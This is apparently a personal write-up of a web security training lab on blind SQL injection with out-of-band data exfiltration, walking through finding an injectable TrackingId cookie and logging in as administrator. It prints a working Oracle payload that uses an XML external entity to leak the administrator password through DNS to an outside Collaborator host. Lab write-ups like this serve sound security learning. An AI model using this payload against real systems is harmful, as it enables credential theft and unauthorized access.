# Lab: Blind SQL Injection with Out-of-Band Data Exfiltration

## Objective
Exploit a blind SQL injection vulnerability to:
- Trigger out-of-band (OAST) interactions
- Exfiltrate sensitive data via DNS
- Extract the administrator password
- Log in as the administrator user

---

## Lab Overview

In this lab:
- The application does **not return query results**
- No visible errors or time delays are present
- We must use **out-of-band techniques** to extract data

## We use **Burp Collaborator** to capture DNS requests containing sensitive data

---

## Step 1: Identify Injection Point

Intercept the request and locate the `TrackingId` cookie.

### Test injection:
TrackingId=xyz'


### Result:
- No visible change in response

### Possible blind SQL injection

---

## Step 2: Get Burp Collaborator Domain

- Open **Burp Suite**
- Go to **Burp Collaborator**
- Click **Copy to clipboard**

Example:
abc123.burpcollaborator.net

---

## Step 3: Exfiltrate Data via DNS

[screen](images/lab17_0.png)

### Payload (Oracle):
x'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.ufd5znsr7ssgo3ux9mv9lpfk9bf53vrk.oastify.com/"> %remote;]>'),'/l') FROM dual)--

[screen](images/lab17_2.png)


[screen](images/lab17_3.png)

[screen](images/lab17_4.png)


---

## Explanation

- The payload:
  - Extracts the administrator password
  - Appends it as a subdomain
  - Forces the database to resolve it via DNS

### This sends a request like:
<password>.abc123.burpcollaborator.net


### Extract the password from the subdomain

---

## Step 5: Login as Administrator

1. Go to login page  
2. Enter:
   - Username: `administrator`
   - Password: (extracted password)

 Lab solved

[screen](images/lab17_5.png)

---

## What I Learned

- How to extract data when no response is available  
- How DNS can be used to leak sensitive information  
- How to use Burp Collaborator for real data exfiltration  
- How blind SQL injection can still fully compromise systems  

---

## Notes

- This lab extends OAST interaction into **data exfiltration**  
- Requires outbound DNS access from the database  
- Very powerful in real-world penetration testing scenarios  
